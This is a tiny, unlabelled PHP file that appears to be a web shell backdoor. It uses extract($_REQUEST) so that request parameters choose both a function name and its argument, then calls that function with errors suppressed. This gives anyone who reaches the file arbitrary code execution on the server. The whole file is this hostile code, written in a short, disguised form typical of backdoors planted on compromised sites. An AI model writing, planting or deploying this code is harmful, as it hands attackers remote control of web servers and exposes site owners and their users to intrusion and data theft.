<?php
extract($_REQUEST) && @$pass(stripslashes($except)) && exit;